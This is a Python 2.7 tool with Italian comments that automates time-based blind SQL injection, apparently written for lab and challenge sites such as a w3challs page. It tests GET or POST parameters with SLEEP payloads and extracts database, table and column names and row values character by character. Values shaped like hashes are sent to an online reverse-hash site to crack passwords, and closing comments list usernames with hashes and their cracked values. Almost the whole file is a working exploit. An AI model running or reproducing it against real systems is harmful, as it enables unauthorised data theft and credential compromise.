#python2.7 daje.py http://192.168.33.10/sqli/time_based_blind.php GET 'email=arthur@guide.com'
#python2.7 daje.py http://vip.hacking.w3challs.com/index.php?page=contact POST 'destin=1&&msg=1'
import requests
import time
import sys
import binascii
import urlparse
from bs4 import BeautifulSoup

nomeDatabase = []
nomeTabella = []
nomeColonna = []
nomeCampo = []
arrayLunghezzaTabelle = []
arrayLunghezzaDatabaseName = []
arrayLunghezzaColumns = []
databaseSelected = ''
tableSelected = ''
stringaNome = ''
stringPattern = ''
numeroColonne = 0	
stringaNomeCampo = ''
stringPass = ''


#Richiesta di connessione in POST o GET
def functionRequest(string):
	
	if method.upper() == "GET":	
		r = requests.get(link + "?" + injectKey + "=" + string)
	else:
		dictionary[injectKey] = string
		r = requests.post(link, data=dictionary)

#Funzione per trovare il massimo tempo di risposta del server
def maxDelay():
	timeStart = time.time()
	functionRequest('1')
	timeEnd = time.time()
	return timeEnd - timeStart

def isNumber(s):
    try:
        int(s)
        return type(int(s))
    except ValueError:
        return type(s)

#Funzione che controlla la correttezza di un carattere.
#Restituisce true se per due volte consecutive 
#viene fatta una sleep corrispondente a quel valore
def checkCorrectness(string):
	timeStart = time.time()
	functionRequest(string)
	timeEnd = time.time()
	if timeEnd - timeStart > timeSleep:
		timeStart = time.time()
		functionRequest(string)
		timeEnd = time.time()
		if timeEnd - timeStart > timeSleep:
			return True
		else:
			return checkCorrectness(string)
	else:
		return False
	
def getCharOfString(s):
	string = ''
	for j in range (0, len(s)):
		string += str(ord(s[j])) + ","
	newString = string[0:len(string)-1]
	return newString

#Funzioni che servono per costruire i vari payload da inviare nel seguito del tool
def payloadLengthDatabase(i, l):
	string = valoreParametro+" AND IF(LENGTH((Select SCHEMA_NAME from information_schema.schemata LIMIT " + str(i) + ",1))=" + str(l) + ", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	print(string)
	return string

def payloadLengthTables(databaseSelected, i, l):
	newString = getCharOfString(databaseSelected)
	string = valoreParametro+" AND IF(LENGTH((Select TABLE_NAME  from information_schema.tables WHERE TABLE_SCHEMA=CHAR(" + newString + ") LIMIT " + str(i) + ",1))=" + str(l) + ", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadLengthColumn(databaseSelected, table, i, l):
	db = getCharOfString(databaseSelected)
	tab = getCharOfString(table)
	string = valoreParametro+" AND IF(LENGTH((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=CHAR(" + db + ") AND TABLE_NAME = CHAR("+tab+") LIMIT " + str(i) + ",1))=" + str(l) + ", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadLength(campo,i,nomeTabella):
	lunghezza = 0
	for l in range(0,maxLength):
		string = valoreParametro + " AND IF(LENGTH((SELECT " + campo + " FROM "+ nomeTabella +" LIMIT " + str(i) +",1))=" + str(l) + ", SLEEP("+str(timeSleep)+"), 		SLEEP(0))" + stringPattern
		if checkCorrectness(string):
			lunghezza = l
			break
	return lunghezza

def payloadNameDatabase(i, mid, char ):
	string = valoreParametro+" AND IF( ORD(MID((SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT " + str(i) + ",1) ," + str(mid)+",1))="+ str(ord(char))+", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadNameTables(databaseSelected, i, mid, char):
	newString = getCharOfString(databaseSelected)
	string = valoreParametro+" AND IF( ORD(MID((Select TABLE_NAME  from information_schema.tables WHERE TABLE_SCHEMA=CHAR(" + newString + ") LIMIT " + str(i) + ",1) ," + str(mid)+",1))="+ str(ord(char))+", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadNameColonne(databaseSelected,table, i, mid, char):
	db = getCharOfString(databaseSelected)
	tab = getCharOfString(table)
	string = valoreParametro+" AND IF( ORD(MID((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=CHAR(" + db + ") AND TABLE_NAME = CHAR("+tab+") LIMIT " + str(i) + ",1) ," + str(mid)+",1))="+ str(ord(char))+", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def numberOfTuple(nomeTabella, i):
	string = valoreParametro + " AND IF((SELECT count(*) FROM " + nomeTabella + " ) = " + str(i) + " , SLEEP("+str(timeSleep)+"), 		SLEEP(0))"+stringPattern
	return string

def payloadNomeCampo(campo,lunghezzaCampo,nomeTabella,i):
	nomeCampo = ''	
	for mid in range(1,lunghezzaCampo+1):
		for char in Caratteri:
			string = valoreParametro+" AND IF( ORD(MID((SELECT "+campo +" FROM "+ nomeTabella +" LIMIT " + str(i) + ",1) ," + str(mid)+",1))="+ str(ord(char))+", SLEEP(" +str(timeSleep)+"), SLEEP(0))"+stringPattern
			if checkCorrectness(string):
				nomeCampo += char
				break
	return nomeCampo

#Funzione per il calcolo dei nomi
def functionName(idPayload, arrayLunghezza, nameSearch, Caratteri, databaseSelected, tableSelected):

	
	#calcolo i nomi del database
	numeroElementi = len(arrayLunghezza)
	stringaNome = ''
	if idPayload == 'db':
		print("calcolo nome database")
	elif idPayload == 'tb':
		print("calcolo nome tabelle")
	elif idPayload == 'cln':
		print("calcolo nome colonne")
	for i in range(0,numeroElementi):
		for mid in range(0,arrayLunghezza[i]):
			for char in Caratteri:
				if (idPayload == 'db'):
					string = payloadNameDatabase(i,mid+1,char)
					print (string)            #commentare per nascondere le query nel terminale
				elif (idPayload == 'tb'):
					string = payloadNameTables(databaseSelected, i, mid + 1, char)
					print (string)
				elif (idPayload == 'cln'):
					string = payloadNameColonne(databaseSelected,tableSelected, i, mid + 1, char)
					print (string)			
				if checkCorrectness(string):
					stringaNome+=char
					break
		
		nameSearch.append(stringaNome)
		stringaNome=''


	end = True
	while (end):
		for i in nameSearch:
			print (i)
		if idPayload == 'db':
			databaseSelected = raw_input("Selezionare una voce: ")
			for i in nameSearch:
				if i == databaseSelected:
					print ("ok")
					end = False
					return databaseSelected
					break
		elif idPayload == 'tb':
			tableSelected = raw_input("Selezionare una tra le seguenti tabelle: ")
			for i in nameSearch:		
				if i == tableSelected:
					print ("ok")
					end = False
					return tableSelected
					break
		else:
			return numeroElementi
			end = False			

#Funzione per il calcolo della lunghezza dei nomi del database
def lengthName(idPayload, maxLength,arrayLunghezza, databaseSelected, tableSelected):
	i = 0
	fine = False
	continua = True
	while(continua):
		for l in range(0,maxLength):
			if (idPayload == 'db'):
				string = payloadLengthDatabase(i,l)
				print (string)                         #commentare per eliminare la query a schermo
			elif (idPayload == 'tb'):
				string = payloadLengthTables(databaseSelected, i, l)
				print (string)
			elif (idPayload == 'cln'):
				string = payloadLengthColumn(databaseSelected, tableSelected, i, l)
				print (string)
			if checkCorrectness(string):
				arrayLunghezza.append(l)
				print("lunghezza-> " + str(l) )
				fine = True
				break
			if l == maxLength-1 and fine == False:
				continua = False 
		i = i + 1
		fine = False
	return arrayLunghezza

#funzione per aggiornamento parametri nella richiesta get per la decodifica password md5
def update_params(stringPass):
    params = (
        ('hash', stringPass),
    )
    return params

'''
	MAIN
'''

if ( len( sys.argv ) <= 1 ):
	print("Sintassi del tool:\nparametro 1: link della pagina su cui fare injection\nparametro 2: metodo della richiesta(get o post)")
	print("parametro 3: parametri e valori da passare alla richiesta con virgolette, ex. 'key1=supermario&&key2=luigi'")
	sys.exit()

maxLength = 100
timeSleep = 2
error = 0.5
Caratteri = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@. _-"
link = sys.argv[1]
method = sys.argv[2]
parametro = sys.argv[3]

print(parametro)

stringLink = "aa?" + parametro
dictionary = dict(urlparse.parse_qsl(urlparse.urlsplit(stringLink).query))
print(dictionary)

#CONTROLLO SE e' INIETTABILE
injectKey = 0
if( method.upper() == "POST" ): 
	for key in dictionary:
		if(injectKey != 0):
			print("FINAL BREAK")
			break
		for i in range(0, 2):
			stringTest = ''
			if( i == 0):
				stringTest = str(dictionary[key]) + " AND SLEEP(" + str(timeSleep) + ")"
			else:
				stringTest = str(dictionary[key]) + " AND SLEEP(" + str(timeSleep) + ")-- -"#controllo se sono necessari i commenti o meno
			print(stringTest)																#nel caso sia un insert o una select
			tmp = dictionary[key]
			dictionary[key] = stringTest
			timeStart = time.time()
			print(dictionary)
			requests.post(link, data=dictionary)
			timeEnd = time.time()
			dictionary[key] = tmp
			if(timeEnd - timeStart > timeSleep):
				print("trovato un valore da su cui fare injection")
				injectKey = key
				if( i == 1 ):
					stringPattern = "-- -"
				break
elif( method.upper() == "GET" ):
	for key in dictionary:
		if(injectKey != 0):
			print("FINAL BREAK")
			break
		for i in range(0, 2):
			stringTest = ''
			q = dictionary[key]
			if isNumber(q) is not int:
				q += "'"
			if( i == 0):
				stringTest = str(q) + " AND SLEEP(" + str(timeSleep) + ")"
			else:
				stringTest = str(q) + " AND SLEEP(" + str(timeSleep) + ")-- -"
			print(stringTest)
			tmp = dictionary[key]
			dictionary[key] = stringTest
			timeStart = time.time()
			print(dictionary)
			requests.get(link + "?" + key + "=" + dictionary[key])
			timeEnd = time.time()
			dictionary[key] = tmp
			if(timeEnd - timeStart > timeSleep):
				print("trovato un valore da su cui fare injection")
				injectKey = key
				dictionary[key] = q
				if( i == 1 ):
					stringPattern = "-- -"
				break
else:
	print("METODO ERRATO")
	sys.exit()
	
#injectKey e la chiave all'interno del dizionario a cui e' collegato l'elemento injectable
valoreParametro = dictionary[injectKey]	

maxD = 0
choice = raw_input("Si desidera ottimizzare il tempo? (y/n) ")
if(choice == "y"):
	listOfTime = []
	for i in range(0, 30):
		m = maxDelay()
		listOfTime.append(m)
	indexMax = listOfTime.index(max(listOfTime))			#ottimizzazione dei tempi
	del(listOfTime[indexMax])
	maxD = max(listOfTime)

if( maxD != 0):
	timeSleep = 4*maxD
else:
	timeSleep = 2
print ("timeSleep-> " + str(timeSleep))
	

idPayload = 'db'  #identifica la query payload va dichiarata prima del richiamo della funzione
#Calcolo lunghezza della stringa del db
arrayLunghezzaDatabaseName = lengthName (idPayload, maxLength, arrayLunghezzaDatabaseName, databaseSelected, tableSelected)
#CALCOLO NOME DB
databaseSelected = functionName(idPayload, arrayLunghezzaDatabaseName, nomeDatabase, Caratteri, databaseSelected, tableSelected)
print("database selezionato: " + databaseSelected)

#calcolo la lunghezza dei nomi delle tabelle
idPayload = 'tb'
arrayLunghezzaTabelle = lengthName(idPayload, maxLength, arrayLunghezzaTabelle, databaseSelected, tableSelected)
#CALCOLO NOME tabella
tableSelected = functionName(idPayload, arrayLunghezzaTabelle, nomeTabella, Caratteri, databaseSelected, tableSelected)
print("tabella selezionata: " + tableSelected)

#calcolo la lunghezza nomi colonne
idPayload = 'cln'
arrayLunghezzaColumns = lengthName(idPayload, maxLength, arrayLunghezzaColumns, databaseSelected, tableSelected)
#CALCOLO NOME COLONNE e RITORNO NUMERO DI COLONNE
numeroColonne = functionName(idPayload, arrayLunghezzaColumns, nomeColonna, Caratteri, databaseSelected, tableSelected)

#CALCOLO IL NUMERO DI TUPLE
i = 0
numeroTuple = 0
exit = True
while(exit):
	string = numberOfTuple(tableSelected, i)
	print(string)
	if checkCorrectness(string):
		numeroTuple = i
		exit = False
	i += 1
print("numero tuple -> " + str(numeroTuple))

#LUNGHEZZA DEL VALORE DEI RECORDS PER OGNI TUPLA
arrayTuplaLunghezzaCampo = []
arrayTuplaLunghezzaCampiTotale = []
for i in range(0, numeroTuple):
	for j in range(0, numeroColonne):
		lunghezza =  payloadLength(nomeColonna[j],i,tableSelected)
		arrayTuplaLunghezzaCampo.append(lunghezza)
	arrayTuplaLunghezzaCampo.append(i)
	arrayTuplaLunghezzaCampiTotale.append(arrayTuplaLunghezzaCampo)
	arrayTuplaLunghezzaCampo = []

#CALCOLO NOME RECORDS
for tuplaLunghezze in arrayTuplaLunghezzaCampiTotale:
	for lunghezzaCampo in range(0, len(tuplaLunghezze)-1):
		valoreCampo = payloadNomeCampo(nomeColonna[lunghezzaCampo],tuplaLunghezze[lunghezzaCampo],tableSelected, arrayTuplaLunghezzaCampiTotale.index(tuplaLunghezze))
		print(valoreCampo)
		if len(valoreCampo) == 32 or len(valoreCampo) == 40:
			nomeCampo.append(valoreCampo)

#DECIFRAZIONE PASSWORD
print ('')
print ('DECIFRO PASSWORD')
print ('')
for md5 in nomeCampo:
    pageMD5 = requests.get('http://hashtoolkit.com/reverse-hash', params=update_params(md5))
    soup = BeautifulSoup(pageMD5.text, "html.parser")
    spans = soup.find_all('span', attrs={'title':'decrypted md5 hash'})
    for span in spans:
        print (md5 + '---->' + span.string)
        print ('')
    spans = soup.find_all('span', attrs={'title':'decrypted sha1 hash'})
    for span in spans:
        print (md5 + '---->' + span.string)
        print ('')
print ('PROGRAMMA TERMINATO')

# Fr4Ger
# b5c0b187fe309af0f4d35982fd961d7e     LOVE

# LuG3R
# 4188679c1d8a284ccc41a6b601869e05     KISS

# K1LLeR
# 031700427b70a87b0203a7d78a85c0da     SMACK

